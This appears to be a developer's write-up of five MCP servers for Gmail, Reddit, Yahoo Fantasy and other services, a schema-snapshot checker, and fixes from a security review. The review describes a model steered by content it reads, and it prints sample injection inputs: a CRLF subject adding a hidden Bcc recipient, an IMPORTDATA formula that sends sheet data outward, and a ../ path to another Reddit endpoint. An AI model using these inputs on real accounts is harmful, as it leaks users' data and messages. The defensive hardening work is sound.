Five MCP servers, and the tool that checks them

5 servers · 69 tools · 5 auth models · 160 offline tests

I've built five Model Context Protocol servers. They let an AI assistant work with real accounts: send email, edit a calendar, write to a spreadsheet, post to Reddit, read a fantasy league. I also built mcp-surface, a command-line tool that connects to an MCP server the way a client does and reports what it actually exposes.

This page covers how the two fit together, and what a security and correctness review of all five servers found in October 2026.

One check in every server's CI

A broken MCP server usually doesn't look broken. It starts, finishes the handshake and shows as connected, while the model gets a worse tool or none at all. Unit tests miss this, because they test the code behind each tool, not the list of tools a client is shown. So the last step in every server's CI runs mcp-surface:

  1. Start the server the way a client would. Listing tools needs no credentials.
  2. Read the tool list and check every schema, name and annotation.
  3. Compare the result with mcp-surface.json, a snapshot committed to the repository.

Any change to a tool's name, description, inputs or annotations fails the build until the snapshot is updated in the same pull request, which turns every such change into a diff someone has to review.

It caught something on the first day. Upgrading the schema library from Zod 3 to Zod 4 looked routine, and every test still passed. mcp-surface reported that all 23 Google tools had changed: Zod 4 stopped marking objects as closed to extra properties, and added a 120-byte pattern to every email field, which pushed the server's tool definitions past their size budget. I kept Zod 3.

The servers

I picked these partly because each one handles authentication differently.

  • google-workspace-mcp 23 tools for Gmail, Calendar, Drive, Sheets and YouTube. Uses my own Google OAuth client with write-only scopes, which keeps it out of Google's paid security review for restricted scopes.
  • supercell-mcp 15 read-only tools for Clash of Clans, Clash Royale and Brawl Stars. Each API key only works from the IP address it was created for.
  • reddit-mcp 12 tools, including posting, commenting, voting and private messages. OAuth with a refresh token that never changes.
  • yahoo-fantasy-mcp 10 read-only tools for leagues, rosters and matchups. OAuth with a refresh token that Yahoo replaces every time it's used.
  • chesscom-mcp 9 read-only tools for profiles, ratings, games and clubs. No authentication.
  • mcp-surface The checker. TypeScript, published on npm with build provenance, and also usable as a GitHub Action.

What the review found

The review started from one assumption: every tool argument is written by a model, and a model that has just read a web page or an email can be steered by what it read. A server that sends email and writes to spreadsheets has to treat its inputs the way a web server treats a form submission. Each fix below shipped with a test that builds the bad input.

Header injection through an email subject

The Gmail tools wrote the subject, recipients and attachment names straight into the message headers, so a subject of Hi\r\nBcc: someone@example.com added a hidden recipient. Line breaks in those fields are now rejected, and non-ASCII text is encoded the way the email standards require (RFC 2047 and 2231).

Formula injection into a spreadsheet

Sheet writes used Google's "as if typed" mode, so a value like =IMPORTDATA("https://…"&A1) became a live formula that could send the sheet's contents to any address. Values are now written as plain text unless the caller asks for formulas.

Requests that escaped their API path

Reddit subreddit names and Yahoo league keys went into request URLs unchecked. URLs resolve .., so a subreddit named ../api/v1/me reached a different Reddit endpoint with the account's access token attached. Each value is now validated, and Yahoo requests are checked after the URL is resolved and before the token is read.

Reddit failures that looked like success

When Reddit rejects a post, for a misspelt subreddit or a rate limit, it still answers with HTTP 200 and puts the reasons in the body. The tool passed that through, so the assistant could report a post that was never made. Those responses are now errors that include Reddit's reasons.

A race on Yahoo's refresh token

Yahoo issues a new refresh token every time one is used. When several tool calls hit an expired token at once, each tried to refresh with the same token: one succeeded, the others failed, and the saved token could be the one already used up. Concurrent calls now share a single refresh, and a test runs four of them through an expiry.

Calendar invitations that were never sent

Google Calendar only emails attendees when the request asks it to, so "invite Alice" created an event Alice never heard about, even though the tool's description said she would. Invitations, updates and cancellations are now emailed by default, with an option to turn that off.

A key file the docs named wrongly

The Clash of Clans tools read their key from coc.json, while the README, the example file and the error message all said clashofclans.json. Following the setup instructions exactly left every Clash of Clans tool broken. A test now ties each game's key file to its example.

2.27 MB of chess games, cut to 238 KB

One titled player's month of games came back as 509 games and 2.27 MB of JSON, far more than an assistant can read in one tool result, so it saw a fragment. Games are now summarised without their move lists by default, with a filter by time control and the full record on request.

282 MB of dependencies, cut to 45 MB

The googleapis package bundles every Google API there is. Switching the Google server to the five per-API packages it actually uses shrank its installed dependencies by more than 80%.

What every repository now has

  • Tests that run without network access or credentials, on Node 20, 22 and 24.
  • A committed tool snapshot that CI checks the running server against.
  • Read-only, destructive and idempotent annotations on every tool, so a client can approve reads automatically and ask before writes.
  • A 30-second timeout on every request, trimmed error messages, and rate-limit errors that say when to retry.
  • No open npm audit advisories at release, plus ESLint, Dependabot, a changelog and a security policy.
